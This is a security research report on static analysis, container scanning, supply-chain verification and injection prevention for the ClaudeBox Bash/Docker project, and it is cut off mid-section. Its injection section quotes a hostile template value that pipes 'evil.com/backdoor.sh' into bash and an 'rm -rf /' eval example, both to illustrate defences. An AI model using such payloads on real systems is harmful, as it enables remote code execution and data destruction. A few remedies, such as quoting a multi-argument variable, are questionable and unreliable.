# Comprehensive Security Scanning and Review Practices for Bash Shell Script Projects

**Research Date:** October 16, 2025
**Project:** ClaudeBox - Docker-based Development Environment
**Focus:** Protecting against poisoned context attacks and supply chain compromises

---

## Executive Summary

This research identifies practical, implementable, and cost-free security solutions for Bash shell script projects using Docker. The focus is on tools and practices suitable for open-source projects with 1000+ users, specifically addressing supply chain security, code injection prevention, and container security.

**Key Recommendations:**
1. **Static Analysis:** ShellCheck + Semgrep for bash-specific security scanning
2. **Container Security:** Trivy for comprehensive image scanning
3. **Secret Detection:** TruffleHog or Gitleaks for credential scanning
4. **Supply Chain:** Syft for SBOM generation + Cosign for image verification
5. **CI/CD Integration:** GitHub Actions workflows with pre-commit hooks

---

## 1. Static Analysis Security Tools

### 1.1 ShellCheck - Primary Bash Security Linter

**Overview:**
- Open-source static analysis tool specifically designed for shell scripts
- Automatically finds bugs, security issues, and anti-patterns
- Free and MIT-licensed

**Security-Relevant Checks:**
- Unquoted variable expansion (command injection risk)
- Unsafe use of eval/exec
- PATH manipulation vulnerabilities
- Improper error handling with set -e
- Word splitting and globbing issues
- File permission problems

**Integration:**
```bash
# Installation (already available via apt/brew)
apt-get install shellcheck

# Basic scan
shellcheck claudebox.sh lib/*.sh

# CI/CD integration
shellcheck --format=gcc --severity=warning **/*.sh
```

**CI/CD Integration:**
```yaml
# .github/workflows/shellcheck.yml
name: ShellCheck
on: [push, pull_request]
jobs:
  shellcheck:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Run ShellCheck
        uses: ludeeus/action-shellcheck@master
        with:
          severity: warning
          check_together: yes
```

**Key Security Rules:**
- SC2086: Double quote to prevent globbing and word splitting
- SC2154: Variable is referenced but not assigned
- SC2046: Quote to prevent word splitting
- SC2006: Use $(...) notation instead of legacy backticks
- SC2090: Quotes/backslashes escape literal in expansions

**Best Practices:**
- Run ShellCheck on every commit via pre-commit hooks
- Configure severity level to at least "warning" for security issues
- Never suppress warnings without documented justification
- Integrate with IDE/editors for real-time feedback

---

### 1.2 Semgrep - Advanced Pattern-Based Security Scanning

**Overview:**
- Fast, lightweight SAST tool supporting 30+ languages including Bash
- ~92% Bash parsing success rate
- Free for open-source projects
- Significantly faster than CodeQL for equivalent coverage

**Key Capabilities:**
- Custom security rules for Bash-specific patterns
- Command injection detection
- Unsafe variable usage patterns
- eval/exec security checks
- Template injection detection

**Installation & Usage:**
```bash
# Installation
pip install semgrep

# Run with default security rules
semgrep --config=auto .

# Run Bash-specific rules
semgrep --config="r/bash.lang.security" .

# CI/CD scan
semgrep ci
```

**Custom Rules for ClaudeBox:**
```yaml
# .semgrep/claudebox-security.yml
rules:
  - id: unsafe-template-substitution
    pattern: |
      eval "$(sed ...)"
    message: "Unsafe template substitution - use validated input"
    severity: ERROR
    languages: [bash]

  - id: unquoted-docker-args
    pattern: |
      docker run ... $UNQUOTED_VAR
    message: "Quote all Docker arguments to prevent injection"
    severity: WARNING
    languages: [bash]

  - id: dangerous-eval-usage
    pattern: eval $USER_INPUT
    message: "Never eval user input - code injection risk"
    severity: ERROR
    languages: [bash]
```

**GitHub Actions Integration:**
```yaml
# .github/workflows/semgrep.yml
name: Semgrep
on: [pull_request]
jobs:
  semgrep:
    runs-on: ubuntu-latest
    container:
      image: semgrep/semgrep
    steps:
      - uses: actions/checkout@v4
      - run: semgrep ci --config=auto
        env:
          SEMGREP_APP_TOKEN: ${{ secrets.SEMGREP_APP_TOKEN }}
```

**Advantages Over CodeQL:**
- ~10 second median scan time vs. minutes for CodeQL
- No database compilation required
- Simpler rule syntax
- Better Bash support
- Completely free for open-source

**Limitations:**
- Less deep inter-procedural analysis than CodeQL
- Pattern-based rather than semantic analysis
- May produce more false positives on complex code

---

### 1.3 Additional SAST Tools

#### Snyk Code (Free for Open Source)
- Supports shell script scanning
- Focus on known vulnerability patterns
- Good CI/CD integration
- Free tier: 200 tests/month for OSS

#### Trivy for IaC Scanning
- Scans Dockerfiles for security issues
- Detects misconfigurations
- Free and open-source
- High accuracy

```bash
# Scan Dockerfile
trivy config templates/Dockerfile.template

# Output
# Results:
# - CIS Docker Benchmark violations
# - Security best practice violations
# - Sensitive data in environment variables
```

---

## 2. Docker Image Security

### 2.1 Trivy - Comprehensive Container Vulnerability Scanner

**Overview:**
- Most recommended open-source container scanner
- Fast, comprehensive, and easy to use
- Scans for CVEs, misconfigurations, secrets, and licenses
- Free and actively maintained by Aqua Security

**Key Features:**
- **Vulnerabilities:** OS packages (apt, apk, etc.) and language libraries
- **Misconfigurations:** Dockerfile, Kubernetes, Terraform
- **Secrets:** Hardcoded credentials, API keys
- **SBOM:** Generates CycloneDX and SPDX formats
- **License:** Detects license compliance issues

**Installation & Usage:**
```bash
# Installation
curl -sfL https://raw.githubusercontent.com/aquasecurity/trivy/main/contrib/install.sh | sh -s -- -b /usr/local/bin

# Scan local image
trivy image claudebox:latest

# Scan with severity filtering
trivy image --severity HIGH,CRITICAL claudebox:latest

# Generate SBOM
trivy image --format cyclonedx --output sbom.json claudebox:latest

# Scan Dockerfile
trivy config templates/Dockerfile.template

# CI/CD scan with exit on vulnerabilities
trivy image --exit-code 1 --severity CRITICAL claudebox:latest
```

**GitHub Actions Integration:**
```yaml
# .github/workflows/trivy.yml
name: Trivy Container Scan
on:
  push:
    branches: [main]
  pull_request:
    branches: [main]

jobs:
  trivy-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Build image
        run: docker build -t claudebox:${{ github.sha }} .

      - name: Run Trivy vulnerability scanner
        uses: aquasecurity/trivy-action@master
        with:
          image-ref: 'claudebox:${{ github.sha }}'
          format: 'sarif'
          output: 'trivy-results.sarif'
          severity: 'CRITICAL,HIGH'

      - name: Upload Trivy results to GitHub Security
        uses: github/codeql-action/upload-sarif@v3
        if: always()
        with:
          sarif_file: 'trivy-results.sarif'
```

**Configuration for ClaudeBox:**
```yaml
# .trivyignore
# Ignore specific CVEs with justification
CVE-2024-1234  # Fixed in next upstream release, no exploit path in our usage

# trivy.yaml
vulnerability:
  type:
    - os
    - library
severity:
  - CRITICAL
  - HIGH
  - MEDIUM
output: json
```

**Performance:**
- **Scan Speed:** ~10-30 seconds for typical images
- **Database Updates:** Automatic daily updates
- **Cache:** Local vulnerability database for offline scanning

---

### 2.2 Grype - Alternative Container Scanner

**Overview:**
- Developed by Anchore
- Focuses on vulnerability scanning with SBOM integration
- Slightly faster than Trivy for pure vulnerability scanning
- Free and open-source

**Key Advantages:**
- Integrates with Syft for SBOM generation
- Very fast startup time
- Simple, focused feature set
- Good for CI/CD pipelines

**Installation & Usage:**
```bash
# Installation
curl -sSfL https://raw.githubusercontent.com/anchore/grype/main/install.sh | sh -s -- -b /usr/local/bin

# Scan image
grype claudebox:latest

# Output formats
grype claudebox:latest -o json
grype claudebox:latest -o sarif

# Use SBOM as input (faster for repeated scans)
syft claudebox:latest -o json > sbom.json
grype sbom:sbom.json
```

**GitHub Actions Integration:**
```yaml
# .github/workflows/grype.yml
name: Grype Vulnerability Scan
on: [push, pull_request]

jobs:
  grype:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: anchore/scan-action@v4
        with:
          image: "claudebox:latest"
          fail-build: true
          severity-cutoff: high
```

**Comparison: Trivy vs Grype**

| Feature | Trivy | Grype |
|---------|-------|-------|
| **Vulnerability DB** | Multiple sources | Multiple sources |
| **Scan Speed** | Fast (~15-30s) | Very fast (~10-20s) |
| **Misconfigurations** | Yes | No |
| **Secrets Detection** | Yes | No |
| **SBOM Generation** | Built-in | Via Syft |
| **License Detection** | Yes | Via Syft |
| **Best For** | Comprehensive scanning | Pure vulnerability scanning |

**Recommendation:** Use **Trivy** for ClaudeBox due to:
- Dockerfile misconfiguration detection
- Secrets scanning capability
- Single tool for multiple security aspects
- Better documentation and community

---

### 2.3 Base Image Security Best Practices

#### Verified Base Images

**Alpine Linux:**
```dockerfile
# Use specific version with digest verification
FROM alpine:3.19.0@sha256:1234abcd...

# Verify with cosign (see section 3.3)
RUN cosign verify alpine:3.19.0
```

**Debian/Ubuntu:**
```dockerfile
# Use minimal variants
FROM debian:bookworm-slim@sha256:5678efgh...

# Or use distroless for even smaller attack surface
FROM gcr.io/distroless/base-debian12
```

**Benefits of Distroless:**
- No shell, package manager, or utilities
- Minimal attack surface (60-70% fewer CVEs)
- Smaller image size
- Not suitable for ClaudeBox (needs full dev environment)

#### Multi-Stage Build Security

```dockerfile
# Build stage with full tooling
FROM debian:bookworm AS builder
RUN apt-get update && apt-get install -y build-essential
COPY . /build
RUN make build

# Runtime stage with minimal dependencies
FROM debian:bookworm-slim
COPY --from=builder /build/output /app
# Only production dependencies in final image
```

#### Image Signing and Verification (Cosign)

See Section 3.3 for detailed Cosign implementation.

---

## 3. Supply Chain Security

### 3.1 SBOM Generation with Syft

**Overview:**
- Creates Software Bill of Materials for container images
- Detects packages from multiple ecosystems (apt, npm, pip, etc.)
- Generates CycloneDX and SPDX formats
- Free and open-source by Anchore

**Installation & Usage:**
```bash
# Installation
curl -sSfL https://raw.githubusercontent.com/anchore/syft/main/install.sh | sh -s -- -b /usr/local/bin

# Generate SBOM for image
syft claudebox:latest -o cyclonedx-json > sbom.json

# Generate SBOM for directory
syft dir:. -o spdx-json > sbom-source.json

# Scan specific package managers
syft claudebox:latest -o table --scope all-layers
```

**What Syft Detects:**
- **APT/DPKG:** Debian package information
- **NPM:** Node.js packages and dependencies
- **PyPI:** Python packages (if Python installed)
- **Go modules:** Binary analysis
- **RPM:** Red Hat packages
- **Alpine APK:** Alpine packages

**SBOM Output Example:**
```json
{
  "bomFormat": "CycloneDX",
  "specVersion": "1.4",
  "components": [
    {
      "type": "library",
      "name": "curl",
      "version": "7.88.1-10+deb12u5",
      "purl": "pkg:deb/debian/curl@7.88.1-10+deb12u5"
    },
    {
      "type": "library",
      "name": "github-cli",
      "version": "2.40.1",
      "purl": "pkg:deb/debian/gh@2.40.1"
    }
  ]
}
```

**GitHub Actions Integration:**
```yaml
# .github/workflows/sbom.yml
name: Generate SBOM
on:
  push:
    tags: ['v*']

jobs:
  sbom:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Build image
        run: docker build -t claudebox:${{ github.ref_name }} .

      - name: Generate SBOM
        uses: anchore/sbom-action@v0
        with:
          image: claudebox:${{ github.ref_name }}
          format: cyclonedx-json
          output-file: claudebox-sbom.json

      - name: Upload SBOM as artifact
        uses: actions/upload-artifact@v4
        with:
          name: sbom
          path: claudebox-sbom.json

      - name: Attach SBOM to release
        uses: softprops/action-gh-release@v1
        with:
          files: claudebox-sbom.json
```

**Benefits:**
- **Transparency:** Know exactly what's in your containers
- **Vulnerability Management:** Quick CVE impact assessment
- **License Compliance:** Identify all open-source licenses
- **Incident Response:** Rapid response to supply chain attacks (e.g., Log4Shell)

---

### 3.2 Package Verification

#### APT Package Verification

**Built-in APT Security:**
```bash
# APT already verifies packages with GPG signatures
# Ensure secure apt is configured in Dockerfile

RUN apt-get update && \
    apt-get install -y --no-install-recommends \
        apt-transport-https \
        ca-certificates \
        gnupg && \
    # Verify GPG keys
    apt-key adv --keyserver keyserver.ubuntu.com --recv-keys KEYID
```

**Additional Verification:**
```bash
# Check package integrity
dpkg --verify curl

# List installed packages with versions
dpkg -l | grep curl

# Verify repository signatures
apt-key list
```

#### NPM Package Verification

**npm audit:**
```bash
# Check for vulnerabilities
npm audit

# Fix vulnerabilities automatically
npm audit fix

# Generate detailed report
npm audit --json > npm-audit.json

# CI/CD integration
npm audit --audit-level=moderate
```

**Package Lock Integrity:**
```bash
# Use package-lock.json with integrity hashes
npm ci  # Clean install using lockfile

# Verify integrity
npm install --integrity-check
```

**SBOM for Node.js:**
```bash
# Generate SBOM for npm project
npm sbom --output sbom.json

# Or use CycloneDX CLI
npm install -g @cyclonedx/cyclonedx-npm
cyclonedx-npm --output-file npm-sbom.json
```

#### Binary Verification (gh, delta, etc.)

**Current ClaudeBox downloads:**
```bash
# GitHub CLI (gh)
curl -fsSL https://cli.github.com/packages/githubcli-archive-keyring.gpg | \
    gpg --dearmor -o /usr/share/keyrings/githubcli-archive-keyring.gpg
echo "deb [arch=$(dpkg --print-architecture) signed-by=/usr/share/keyrings/githubcli-archive-keyring.gpg] \
    https://cli.github.com/packages stable main" > /etc/apt/sources.list.d/github-cli.list
apt-get install gh

# Delta (git diff viewer)
# Download from GitHub releases with checksum verification
```

**Enhanced Binary Verification:**
```bash
# 1. Download with checksum
DELTA_VERSION="0.16.5"
DELTA_URL="https://github.com/dandavison/delta/releases/download/${DELTA_VERSION}/git-delta_${DELTA_VERSION}_amd64.deb"
DELTA_CHECKSUM_URL="${DELTA_URL}.sha256"

curl -fsSL -o delta.deb "$DELTA_URL"
curl -fsSL -o delta.deb.sha256 "$DELTA_CHECKSUM_URL"

# 2. Verify checksum
sha256sum -c delta.deb.sha256

# 3. Install if verification succeeds
dpkg -i delta.deb

# 4. Verify with cosign if signatures available
cosign verify-blob --signature delta.deb.sig --key cosign.pub delta.deb
```

---

### 3.3 Image Signing with Cosign (Sigstore)

**Overview:**
- Cryptographically sign and verify container images
- Part of Sigstore project (Linux Foundation)
- Supports keyless signing via OIDC
- Free and open-source

**Installation:**
```bash
# Install cosign
curl -O -L "https://github.com/sigstore/cosign/releases/latest/download/cosign-linux-amd64"
mv cosign-linux-amd64 /usr/local/bin/cosign
chmod +x /usr/local/bin/cosign
```

**Keyless Signing (OIDC):**
```bash
# Sign image (opens browser for OIDC auth)
cosign sign claudebox:latest

# Signature stored in registry as:
# claudebox:sha256-<digest>.sig
```

**Key-Based Signing:**
```bash
# Generate key pair
cosign generate-key-pair

# Sign with private key
cosign sign --key cosign.key claudebox:latest

# Verify with public key
cosign verify --key cosign.pub claudebox:latest
```

**GitHub Actions Integration:**
```yaml
# .github/workflows/sign-image.yml
name: Sign Container Image
on:
  push:
    tags: ['v*']

permissions:
  contents: read
  id-token: write  # Required for keyless signing
  packages: write

jobs:
  sign:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Install cosign
        uses: sigstore/cosign-installer@v3

      - name: Login to registry
        uses: docker/login-action@v3
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}

      - name: Build and push
        uses: docker/build-push-action@v5
        with:
          push: true
          tags: ghcr.io/bdmorin/claudebox:${{ github.ref_name }}

      - name: Sign image with keyless signing
        run: |
          cosign sign --yes ghcr.io/bdmorin/claudebox:${{ github.ref_name }}
```

**User Verification:**
```bash
# Users can verify signatures
cosign verify \
  --certificate-identity https://github.com/bdmorin/claudebox/.github/workflows/sign-image.yml@refs/tags/v1.0.0 \
  --certificate-oidc-issuer https://token.actions.githubusercontent.com \
  ghcr.io/bdmorin/claudebox:v1.0.0
```

**Benefits for ClaudeBox:**
- Users can verify image authenticity
- Protection against registry tampering
- Supply chain attack prevention
- No key management with keyless signing

---

## 4. Code Injection Prevention

### 4.1 Template Injection Vulnerabilities

**ClaudeBox Template System:**
```bash
# Current implementation (templates/Dockerfile.template)
sed "s|{{BASE_IMAGE}}|debian:bookworm-slim|g" \
    templates/Dockerfile.template > Dockerfile
```

**Security Risks:**
```bash
# VULNERABLE: If {{BASE_IMAGE}} comes from user input
BASE_IMAGE="debian:bookworm; RUN curl evil.com/backdoor.sh | bash"
sed "s|{{BASE_IMAGE}}|$BASE_IMAGE|g" template
# Results in code injection in Dockerfile
```

**Secure Implementation:**

1. **Input Validation:**
```bash
# Whitelist allowed base images
validate_base_image() {
    local image=$1
    local allowed_images=(
        "debian:bookworm"
        "debian:bookworm-slim"
        "ubuntu:22.04"
        "alpine:3.19"
    )

    for allowed in "${allowed_images[@]}"; do
        if [[ "$image" == "$allowed" ]]; then
            return 0
        fi
    done

    log "ERROR: Unauthorized base image: $image"
    return 1
}

BASE_IMAGE="debian:bookworm"
if validate_base_image "$BASE_IMAGE"; then
    sed "s|{{BASE_IMAGE}}|$BASE_IMAGE|g" template
fi
```

2. **Use Safe Substitution:**
```bash
# Instead of sed with user input, use safe parameter expansion
render_template() {
    local template_file=$1
    local base_image=$2

    # Read template
    local template
    template=$(<"$template_file")

    # Safe substitution using bash parameter expansion
    # No eval, no sed with user input
    template="${template//\{\{BASE_IMAGE\}\}/$base_image}"

    printf '%s\n' "$template"
}
```

3. **Avoid Dynamic Template Variables:**
```bash
# BAD: Don't accept arbitrary template variables
while IFS='=' read -r key value; do
    sed "s|{{$key}}|$value|g" template  # DANGEROUS
done

# GOOD: Fixed set of allowed variables
render_dockerfile() {
    local -A vars=(
        [BASE_IMAGE]="$BASE_IMAGE"
        [NODE_VERSION]="$NODE_VERSION"
        [USER_ID]="$USER_ID"
    )

    # Validate all values first
    for value in "${vars[@]}"; do
        if [[ "$value" =~ [^a-zA-Z0-9:._-] ]]; then
            die "Invalid character in template variable"
        fi
    done

    # Then substitute
    # ... safe substitution logic
}
```

---

### 4.2 Command Injection in Shell Scripts

**Common Vulnerable Patterns:**

```bash
# 1. VULNERABLE: Unquoted variables
docker run $DOCKER_ARGS claudebox  # Word splitting attack

# SAFE:
docker run "$DOCKER_ARGS" claudebox

# 2. VULNERABLE: eval with user input
eval "$USER_COMMAND"  # Arbitrary code execution

# SAFE: Don't use eval with user input at all

# 3. VULNERABLE: Backticks with user input
result=`grep "$USER_INPUT" file`  # Shell metacharacter injection

# SAFE: Use $(...) and quote
result=$(grep -F -- "$USER_INPUT" file)  # -F = literal, -- = end of options

# 4. VULNERABLE: Unvalidated command options
git commit -m "$USER_MESSAGE"  # Could be: -m "msg" --cleanup=strip

# SAFE: Use -- to terminate options
git commit -m "$USER_MESSAGE" --

# 5. VULNERABLE: PATH manipulation
export PATH="$USER_PATH:$PATH"
ls  # Could execute malicious 'ls' from USER_PATH

# SAFE: Use absolute paths
/bin/ls
```

**ClaudeBox Specific Concerns:**

```bash
# Docker command construction
build_docker_command() {
    local project_dir=$1
    local profile=$2

    # VULNERABLE
    docker run -v $project_dir:/workspace claudebox

    # SAFE
    docker run -v "$project_dir:/workspace" claudebox

    # Even better: Validate path first
    if [[ ! -d "$project_dir" ]]; then
        die "Invalid project directory"
    fi
    if [[ "$project_dir" == *$'\n'* ]] || [[ "$project_dir" == *';'* ]]; then
        die "Project path contains invalid characters"
    fi
    docker run -v "$project_dir:/workspace" claudebox
}
```

**Input Validation Framework:**

```bash
# Validate alphanumeric with specific allowed chars
validate_alphanumeric() {
    local input=$1
    local name=$2
    if [[ ! "$input" =~ ^[a-zA-Z0-9._-]+$ ]]; then
        die "Invalid $name: must contain only alphanumeric, dot, dash, underscore"
    fi
}

# Validate paths
validate_path() {
    local path=$1
    # Check for directory traversal
    if [[ "$path" == *".."* ]]; then
        die "Path contains directory traversal"
    fi
    # Check for null bytes
    if [[ "$path" == *$'\0'* ]]; then
        die "Path contains null byte"
    fi
    # Resolve to absolute path
    path=$(realpath -e "$path" 2>/dev/null) || die "Path does not exist"
    printf '%s' "$path"
}

# Usage
PROJECT_DIR=$(validate_path "$USER_INPUT_DIR")
PROFILE=$(validate_alphanumeric "$USER_INPUT_PROFILE" "profile name")
```

---

### 4.3 Dangerous Patterns: eval and exec

**Why eval is Dangerous:**

```bash
# eval executes string as code
user_input="ls; rm -rf /"
eval "$user_input"  # DISASTER

# Even "safe" usage is risky
cmd="ls -la"
eval "$cmd"  # What if $cmd was constructed from user input earlier?
```

**When eval Might Be Needed:**

```bash
# Dynamic variable names (AVOID if possible)
eval "export PROFILE_${profile}_ENABLED=1"

# BETTER ALTERNATIVE: Use arrays or case statements
case "$profile" in
    python)  PROFILE_PYTHON_ENABLED=1 ;;
    node)    PROFILE_NODE_ENABLED=1 ;;
    *)       die "Unknown profile" ;;
esac
```

**Safe Alternatives to eval:**

```bash
# 1. For dynamic variable names: use declare
declare "PROFILE_${profile}_ENABLED=1"

# 2. For command construction: use arrays
docker_args=(
    --rm
    -it
    -v "$PROJECT_DIR:/workspace"
)
docker run "${docker_args[@]}" claudebox

# 3. For reading into variables: use read
IFS='=' read -r key value <<< "$line"
```

**exec Security:**

```bash
# exec replaces current shell with command
exec "$USER_COMMAND"  # If USER_COMMAND is malicious, game over

# SAFE: Validate command is from whitelist
case "$COMMAND" in
    bash|sh|zsh)
        exec "$COMMAND"
        ;;
    *)
        die "Command not allowed"
        ;;
esac
```

**ShellCheck Rules for eval/exec:**

- SC2294: eval can't be used safely with variable expansion
- SC2086: Double quote to prevent globbing and word splitting
- SC2229: This eval construct is unreliable. Use declare instead

---

### 4.4 Input Validation Best Practices

**Defense in Depth:**

```bash
# Layer 1: Whitelist validation
validate_profile_whitelist() {
    local profile=$1
    case "$profile" in
        base|python|node|go|rust|java|c) return 0 ;;
        *) die "Invalid profile: $profile" ;;
    esac
}

# Layer 2: Character validation
validate_profile_chars() {
    local profile=$1
    if [[ ! "$profile" =~ ^[a-z]+$ ]]; then
        die "Profile name must be lowercase letters only"
    fi
}

# Layer 3: Length validation
validate_profile_length() {
    local profile=$1
    if [[ ${#profile} -gt 20 ]]; then
        die "Profile name too long"
    fi
}

# Combined validation
validate_profile() {
    local profile=$1
    validate_profile_length "$profile"
    validate_profile_chars "$profile"
    validate_profile_whitelist "$profile"
}
```

**Never Trust, Always Verify:**

```bash
# Even "internal" values should be validated
# They might come from config files, environment, etc.

load_config() {
    local config_file=$1

    # Read config
    source "$config_file"  # DANGEROUS - arbitrary code execution

    # SAFE: Parse config without executing
    while IFS='=' read -r key value; do
        case "$key" in
            BASE_IMAGE)
                validate_base_image "$value"
                BASE_IMAGE=$value
                ;;
            NODE_VERSION)
                validate_version "$value"
                NODE_VERSION=$value
                ;;
            *)
                log "WARNING: Unknown config key: $key"
                ;;
        esac
    done < "$config_file"
}
```

**Logging for Security Audits:**

```bash
# Log all validation failures for security monitoring
validate_with_logging() {
    local input=$1
    local type=$2

    if ! validate_"$type" "$input"; then
        # Security event: validation failure
        log "SECURITY: Validation failed for $type: $input"
        log "SECURITY: Called from ${BASH_SOURCE[1]}:${BASH_LINENO[0]}"
        log "SECURITY: Function: ${FUNCNAME[1]}"
        return 1
    fi
    return 0
}
```

---

## 5. CI/CD Security Gates

### 5.1 Pre-commit Hooks

**Setup pre-commit framework:**

```bash
# Install pre-commit
pip install pre-commit

# Create .pre-commit-config.yaml
cat > .pre-commit-config.yaml << 'EOF'
repos:
  # ShellCheck for bash security
  - repo: https://github.com/shellcheck-py/shellcheck-py
    rev: v0.9.0.6
    hooks:
      - id: shellcheck
        args: ['--severity=warning']

  # detect-secrets for credential scanning
  - repo: https://github.com/Yelp/detect-secrets
    rev: v1.4.0
    hooks:
      - id: detect-secrets
        args: ['--baseline', '.secrets.baseline']

  # Trivy for Dockerfile scanning
  - repo: https://github.com/aquasecurity/trivy
    rev: v0.48.0
    hooks:
      - id: trivy-config
        files: 'Dockerfile|\.ya?ml$'

  # General security
  - repo: https://github.com/pre-commit/pre-commit-hooks
    rev: v4.5.0
    hooks:
      - id: check-added-large-files
        args: ['--maxkb=100']
      - id: check-merge-conflict
      - id: check-yaml
      - id: end-of-file-fixer
      - id: trailing-whitespace
      - id: detect-private-key

  # Semgrep security scanning
  - repo: https://github.com/returntocorp/semgrep
    rev: v1.52.0
    hooks:
      - id: semgrep
        args: ['--config=auto']
EOF

# Install hooks
pre-commit install

# Run on all files
pre-commit run --all-files
```

**Custom pre-commit hook for ClaudeBox:**

```bash
# .git/hooks/pre-commit
#!/bin/bash
set -euo pipefail

echo "Running ClaudeBox security checks..."

# 1. ShellCheck
echo "→ Running ShellCheck..."
shellcheck --severity=warning claudebox.sh lib/*.sh || {
    echo "❌ ShellCheck failed"
    exit 1
}

# 2. Detect secrets
echo "→ Scanning for secrets..."
detect-secrets scan --baseline .secrets.baseline || {
    echo "❌ Secret detected"
    exit 1
}

# 3. Check for dangerous patterns
echo "→ Checking for dangerous patterns..."
if grep -r "eval.*\$" --include="*.sh" .; then
    echo "❌ Found eval with variable - security risk"
    exit 1
fi

# 4. Validate template files
echo "→ Validating templates..."
if grep -r "{{.*}}" templates/ | grep -v "{{BASE_IMAGE}}\|{{NODE_VERSION}}\|{{USER_ID}}"; then
    echo "❌ Found unknown template variable"
    exit 1
fi

echo "✅ All security checks passed"
```

**GitHub Actions for pre-commit:**

```yaml
# .github/workflows/pre-commit.yml
name: Pre-commit Checks
on: [push, pull_request]

jobs:
  pre-commit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-python@v5
        with:
          python-version: '3.11'

      - name: Install pre-commit
        run: pip install pre-commit

      - name: Run pre-commit
        run: pre-commit run --all-files --show-diff-on-failure
```

---

### 5.2 GitHub Actions Security Workflows

**Comprehensive Security Pipeline:**

```yaml
# .github/workflows/security.yml
name: Security Pipeline
on:
  push:
    branches: [main]
  pull_request:
    branches: [main]
  schedule:
    # Run daily at 2 AM UTC
    - cron: '0 2 * * *'

permissions:
  contents: read
  security-events: write
  pull-requests: write

jobs:
  shellcheck:
    name: ShellCheck Analysis
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Run ShellCheck
        uses: ludeeus/action-shellcheck@master
        with:
          severity: warning
          format: gcc
          scandir: '.'
          check_together: 'yes'

  semgrep:
    name: Semgrep SAST
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Run Semgrep
        uses: returntocorp/semgrep-action@v1
        with:
          config: >-
            p/security-audit
            p/bash
          generateSarif: true

      - name: Upload SARIF
        uses: github/codeql-action/upload-sarif@v3
        with:
          sarif_file: semgrep.sarif

  trivy:
    name: Trivy Container Scan
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Build test image
        run: docker build -t claudebox:test .

      - name: Run Trivy scanner
        uses: aquasecurity/trivy-action@master
        with:
          image-ref: 'claudebox:test'
          format: 'sarif'
          output: 'trivy-results.sarif'
          severity: 'CRITICAL,HIGH,MEDIUM'

      - name: Upload Trivy results
        uses: github/codeql-action/upload-sarif@v3
        with:
          sarif_file: 'trivy-results.sarif'

      - name: Fail on HIGH/CRITICAL
        uses: aquasecurity/trivy-action@master
        with:
          image-ref: 'claudebox:test'
          exit-code: 1
          severity: 'CRITICAL,HIGH'

  secrets:
    name: Secret Scanning
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0  # Full history for git scanning

      - name: TruffleHog Scan
        uses: trufflesecurity/trufflehog@main
        with:
          path: ./
          base: ${{ github.event.repository.default_branch }}
          head: HEAD
          extra_args: --debug --only-verified

  dependency-review:
    name: Dependency Review
    runs-on: ubuntu-latest
    if: github.event_name == 'pull_request'
    steps:
      - uses: actions/checkout@v4

      - name: Dependency Review
        uses: actions/dependency-review-action@v4
        with:
          fail-on-severity: moderate

  sbom:
    name: Generate SBOM
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Build image
        run: docker build -t claudebox:sbom .

      - name: Generate SBOM
        uses: anchore/sbom-action@v0
        with:
          image: claudebox:sbom
          format: cyclonedx-json
          output-file: sbom.json

      - name: Upload SBOM
        uses: actions/upload-artifact@v4
        with:
          name: sbom
          path: sbom.json
          retention-days: 90

  security-summary:
    name: Security Summary
    needs: [shellcheck, semgrep, trivy, secrets]
    runs-on: ubuntu-latest
    if: always()
    steps:
      - name: Check all jobs passed
        run: |
          if [[ "${{ needs.shellcheck.result }}" != "success" ]] || \
             [[ "${{ needs.semgrep.result }}" != "success" ]] || \
             [[ "${{ needs.trivy.result }}" != "success" ]] || \
             [[ "${{ needs.secrets.result }}" != "success" ]]; then
            echo "❌ Security checks failed"
            exit 1
          fi
          echo "✅ All security checks passed"
```

**Pull Request Comment Integration:**

```yaml
# Add to security workflow
  pr-comment:
    name: PR Security Comment
    needs: [trivy, semgrep]
    runs-on: ubuntu-latest
    if: github.event_name == 'pull_request'
    permissions:
      pull-requests: write
    steps:
      - uses: actions/checkout@v4

      - name: Comment PR
        uses: actions/github-script@v7
        with:
          script: |
            const fs = require('fs');

            // Read scan results
            const trivy = fs.readFileSync('trivy-results.sarif', 'utf8');
            const trivyJson = JSON.parse(trivy);

            const vulnCount = trivyJson.runs[0].results.length;

            const comment = `
            ## 🔒 Security Scan Results

            - **Trivy**: ${vulnCount} vulnerabilities found
            - **Semgrep**: Check [workflow run](${process.env.GITHUB_SERVER_URL}/${process.env.GITHUB_REPOSITORY}/actions/runs/${process.env.GITHUB_RUN_ID})
            - **ShellCheck**: ✅ Passed

            ${vulnCount > 0 ? '⚠️ Please review and fix vulnerabilities before merging' : '✅ No security issues detected'}
            `;

            github.rest.issues.createComment({
              issue_number: context.issue.number,
              owner: context.repo.owner,
              repo: context.repo.repo,
              body: comment
            });
```

---

### 5.3 Branch Protection Rules

**Recommended GitHub Settings:**

```yaml
# Repository Settings → Branches → Branch protection rules

main:
  required_status_checks:
    strict: true  # Require branches to be up to date
    contexts:
      - ShellCheck Analysis
      - Semgrep SAST
      - Trivy Container Scan
      - Secret Scanning

  required_pull_request_reviews:
    required_approving_review_count: 1
    dismiss_stale_reviews: true
    require_code_owner_reviews: true

  restrictions: null  # No push restrictions for OSS

  required_signatures: true  # Require signed commits

  block_creations: false
```

**CODEOWNERS for Security:**

```
# .github/CODEOWNERS
# Security-critical files require additional review

# Shell scripts
*.sh @bdmorin @security-team

# Docker configuration
Dockerfile* @bdmorin @security-team
templates/ @bdmorin @security-team

# GitHub workflows (can modify CI/CD)
.github/workflows/ @bdmorin

# Security configuration
.trivyignore @bdmorin @security-team
.semgrep/ @bdmorin @security-team
```

---

## 6. Secrets and Credential Management

### 6.1 Detecting Hardcoded Secrets

#### TruffleHog - Most Comprehensive

**Installation & Usage:**
```bash
# Install
